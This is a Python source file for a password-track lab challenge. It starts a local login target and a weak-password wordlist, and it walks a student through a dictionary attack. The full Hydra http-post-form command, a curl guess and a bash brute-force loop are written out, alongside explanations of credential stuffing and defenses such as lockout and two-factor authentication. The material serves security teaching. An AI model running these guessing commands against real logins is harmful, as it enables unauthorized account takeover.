"""dict-hydra: guess a live login's password from a wordlist with Hydra.

setup() starts the httpauth target (127.0.0.1 only) and writes a wordlist of
400 weak passwords into the student's workspace. admin's password is one of
them and looks like the rest, and the login allows unlimited attempts, so
Hydra finds it:

    hydra -l admin -P dict-hydra/wordlist.txt -s <port> 127.0.0.1 \
        http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid username or password'

The student submits the recovered password (the flag shown after logging in
with it is accepted too). This is a separate target from web-sqli: there is
no injection here, only a guessable password and nothing slowing the guessing.
"""

from __future__ import annotations

import shlex
from typing import List, Tuple

from cyberlab import targets, wordlists
from cyberlab.challenges import Challenge, register
from cyberlab.httpauth import FAILURE
from cyberlab.workspace import Workspace


class DictHydra(Challenge):
    def _password(self, ws: Workspace) -> str:
        # Must match cyberlab.httpauth.make_credentials (same wordlist label).
        return wordlists.chosen_password(ws, "dict-hydra")

    def _hydra(self, ws: Workspace, port: int) -> str:
        wl = shlex.quote(str(ws.home / "dict-hydra" / "wordlist.txt"))
        form = f"/login:username=^USER^&password=^PASS^:F={FAILURE}"
        return f"hydra -l admin -P {wl} -s {port} 127.0.0.1 http-post-form {shlex.quote(form)}"

    def setup(self, ws: Workspace) -> str:
        port = targets.start(ws, "httpauth")
        wl = ws.path("dict-hydra", "wordlist.txt")
        wl.write_text("\n".join(wordlists.password_candidates(ws, "dict-hydra")) + "\n",
                      encoding="utf-8")
        return (
            f"Target: http://127.0.0.1:{port}/login\n"
            f"Wordlist: {wl}\n"
            "The username is admin. Run Hydra against the login form, then submit the "
            "password it finds:\n"
            f"  {self._hydra(ws, port)}"
        )

    def check(self, ws: Workspace, answer: str) -> bool:
        return answer.strip() == self._password(ws) or ws.matches_flag(self.id, answer)

    def snippets(self, ws: Workspace) -> List[Tuple[str, str]]:
        port = targets.port_of(ws, "httpauth")
        url = f"http://127.0.0.1:{port}"
        wl = shlex.quote(str(ws.home / "dict-hydra" / "wordlist.txt"))
        return [
            ("Try every password in the list against the login form. The last part is "
             "path : form body : F=text that means the login failed",
             self._hydra(ws, port)),
            ("One guess by hand: this is all Hydra sends, 400 times",
             f"curl -s {url}/login -d username=admin -d password=summer2024 | grep -c '{FAILURE}'"),
            ("The same attack with curl and a loop",
             "while read -r pw; do\n"
             f"  curl -s {url}/login -d username=admin --data-urlencode \"password=$pw\" \\\n"
             f"    | grep -q '{FAILURE}' || {{ echo \"found: $pw\"; break; }}\n"
             f"done < {wl}"),
            ("What it looked like from the server's side: one line per guess",
             f"grep -c 'POST /login' {shlex.quote(str(ws.home / 'logs' / 'httpauth.log'))}"),
        ]


register(DictHydra(
    id="dict-hydra",
    title="Dictionary attack on a live login with Hydra",
    track="passwords",
    difficulty="medium",
    goal=("The Northwind timesheet login lets you guess as many times as you like. "
          "The admin's password is weak enough to be in a wordlist. Run Hydra against "
          "the login and submit the password it recovers."),
    hints=[
        "Try one wrong login in Firefox or with curl and note exactly what the page says. "
        "Hydra needs that text to tell a failed guess from a successful one.",
        "The form POSTs username and password to /login, so the module is http-post-form: "
        "'/login:username=^USER^&password=^PASS^:F=<failure text>'",
        "The failure text is: Invalid username or password. The full command is in the "
        "start output: cyberlab start dict-hydra",
    ],
    tools=["hydra", "curl"],
    learned=("You guessed a password against a live login, hundreds of times in a few "
             "seconds, and the login never objected. Nothing was exploited: the form did its "
             "job every time. The weaknesses were a password common enough to be in a list "
             "and a server that allows unlimited attempts."),
    real_world=("This is the most common way real accounts are taken over. Attackers "
                "replay lists of leaked and common passwords against every login they can "
                "reach: webmail, VPNs, SSH, admin panels. Trying leaked username and "
                "password pairs is called credential stuffing; trying one common password "
                "across many accounts, to stay under lockout limits, is password spraying. "
                "Any server on the internet sees these attempts within minutes."),
    defend=[
        "Limit attempts: slow down or lock after a few failures, per account and per address.",
        "Require two-factor authentication, so a guessed password isn't a login.",
        "Refuse known-breached and common passwords when users choose one.",
        "Alert on bursts of failed logins. The server log here shows every guess.",
        "Tools such as fail2ban block an address after repeated failures.",
    ],
))
